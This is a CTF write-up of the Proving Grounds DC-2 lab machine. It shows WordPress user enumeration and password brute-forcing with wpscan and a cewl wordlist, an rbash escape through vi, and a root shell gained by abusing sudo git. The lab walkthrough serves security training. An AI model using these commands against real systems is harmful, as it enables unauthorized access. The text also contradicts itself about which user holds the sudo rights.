---
title: "Proving grounds Play: DC-2"
layout: post
date: 2023-09-06 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)
|   2048 5911d8af38518f41a744b32803809942 (RSA)
|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)
|_  256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

make entry in the `/etc/hosts` file as `dc-2` for the attacking machine IP.

## Web PORT: 80

![img](/assets/images/CTF/Proving_Grounds/DC-2/web.png)

**Techstack**
- Wordpress

### WPscan

```
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
```

**Usernames Enumerated**

```text
admin
jerry
tom
```

### Hint

As shown in the webpage the wordslist has to be created using the tool named `cewl`

```sh
cewl http://dc-2/ > password
```
## Bruteforce credentials usgin WPscan

```sh
wpscan --url http://dc-2/ -U users -P password
```

**Credentials Obtained**

![img](/assets/images/CTF/Proving_Grounds/DC-2/credentials.png)

SSH to the machine using the credentials. The user `jerry` doesn't have SSH login permission, so login to user `tom`.

### Escaping rbash

```sh
vi
:set shell=/bin/bash
:shell
```

Type the above commmands to escape from the rbash to standard unix shell.

User `tom` may not run anything as sudo on machine DC-2. So switch to user `jerry`.

![img](/assets/images/CTF/Proving_Grounds/DC-2/shell.png)

User tom can run `/usr/bin/git` as sudo.

Search for exploit on GTFO Bins. As per the page the binary can be used to elevate sudo permissions using below commands.

![img](/assets/images/CTF/Proving_Grounds/DC-2/exploit.png)

```sh
sudo git -p help config

# Once the git manual page appears type the below and hit enter
!/bin/bash
```

**Root Shell Obtained**

![img](/assets/images/CTF/Proving_Grounds/DC-2/root.png)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).